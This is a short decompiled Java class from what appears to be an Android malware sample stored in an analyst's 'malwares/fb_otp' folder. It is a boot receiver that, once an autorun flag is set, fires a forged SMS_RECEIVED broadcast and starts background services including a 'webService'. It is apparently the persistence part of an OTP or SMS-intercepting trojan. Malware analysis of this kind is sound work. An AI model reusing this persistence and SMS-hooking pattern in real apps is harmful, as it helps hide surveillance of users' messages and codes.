package com.soft360.iService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

public class AutoStart
  extends BroadcastReceiver
{
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    SharedPreferences localSharedPreferences = PreferenceManager.getDefaultSharedPreferences(paramContext);
    if ((paramIntent.getAction().equals("android.intent.action.BOOT_COMPLETED")) && (localSharedPreferences.getBoolean("autorun", false)))
    {
      paramIntent = new Intent("android.provider.Telephony.SMS_RECEIVED");
      paramIntent.setClass(paramContext, SmsReciever.class);
      paramContext.sendBroadcast(paramIntent);
      paramContext.startService(new Intent(paramContext, AService.class));
      paramContext.startService(new Intent(paramContext, webService.class));
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/com/soft360/iService/AutoStart.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */